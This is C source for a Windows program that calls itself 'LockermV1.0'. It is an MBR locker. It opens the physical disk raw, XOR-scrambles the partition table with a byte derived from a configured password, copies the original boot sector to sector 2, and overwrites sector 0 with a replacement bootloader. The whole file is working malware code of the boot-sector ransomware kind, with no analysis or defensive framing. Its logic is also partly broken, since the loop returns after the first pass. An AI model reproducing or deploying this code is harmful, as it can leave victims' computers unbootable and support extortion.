#include <windows.h>
#include "bin.h"
#define cryptFlag 445

int ReadDisk(int Id, int num, unsigned char *buffer);
int WriteDisk(int Id, int num, unsigned char *buffer);
int _stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow){
	char keys[256] = { 0 };
	unsigned char mbr[512] = { 0 };//use it to save MBR data
	unsigned char len;
	int i = 0;
	GetPrivateProfileStringA("Locker", "psw", "shisan", keys, 256, ".\\Config.ini");
	len = strlen(keys);
	if (len == 0 || len >= 18){
		MessageBoxA(NULL, "Error Reading passcode!", "Error", MB_OK | MB_ICONERROR);
		exit(-1);
	}
	byte XResult = 0;	//Password Encrypted
	for (i = 0; i<len; i++){
		XResult ^= keys[i];
	}

	if (ReadDisk(0, 1, mbr) == 0){
		MessageBoxA(NULL, "Read MBR failed!", "ERROR", MB_OK | MB_ICONERROR);
		exit(-1);
	}

	if (mbr[cryptFlag] == 0x16){  //0x16  可以是任何数字
		MessageBoxA(NULL, "Initialization Complete.", "ERROR", MB_OK | MB_ICONERROR);
		exit(-1);
	}

	mbr[cryptFlag] = 0x16;
	for (i = 0; i < 64; i++){
		mbr[446 + i] ^= XResult;
		WriteDisk(2, 1, mbr);//Backup bootloader to the 3rd sector
		memcpy(lock_disk+cryptFlag,mbr+cryptFlag,67);
		WriteDisk(0, 1, lock_disk);
		MessageBoxA(NULL, "Lock Complete", "LockermV1.0", MB_OK | MB_ICONERROR);
		return 0;
	}
}

int ReadDisk(int Id,int num,unsigned char *buffer)
{
		/*
		Read sectors
		id=ID number
		num=The number of reads
		*/
		HANDLE hFile = NULL;
		int offset = 0;
		int ReadSize = 0;
		DWORD Readed = 0;
		offset = Id * 512;
		ReadSize = num * 512;
		if (buffer == NULL){
			return ReadSize;
		}
		hFile = CreateFileA("\\\\.\\\\physicaldrive0",
			GENERIC_READ,
			FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,NULL);
		if (hFile == INVALID_HANDLE_VALUE){
			MessageBoxA(NULL, "Crash! Can't Open \\\\.\\\\PhysicalDrive0..", "ERROR", MB_OK | MB_ICONERROR);
			return 0;
		}
		SetFilePointer(hFile,offset,0,0);
		ReadFile(hFile, buffer, ReadSize, &Readed, NULL);
		CloseHandle(hFile);
		return Readed;
};

int WriteDisk(int Id, int num, unsigned char *buffer){
	/*
	WriteDisk
	*/
	HANDLE hFile = NULL;
	int offset = 0;
	int WirteSize = 0;
	DWORD Writed = 0;
	offset = Id * 512;
	WirteSize = num * 512;
	if (buffer == NULL){
		return WirteSize;
	}
	//open it
	hFile = CreateFileA("\\\\.\\\\physicaldrive0",1073741824,1,0,3,128,0);
	if (hFile == INVALID_HANDLE_VALUE){
		MessageBoxA(NULL, "Crash! Can't Open \\\\.\\\\PhysicalDrive0..", "ERROR", MB_OK | MB_ICONERROR);
		return 0;
	}
	SetFilePointer(hFile, offset, 0, 0);
	WriteFile(hFile, buffer, WirteSize, &Writed, NULL);
	CloseHandle(hFile);
	return WirteSize;
}
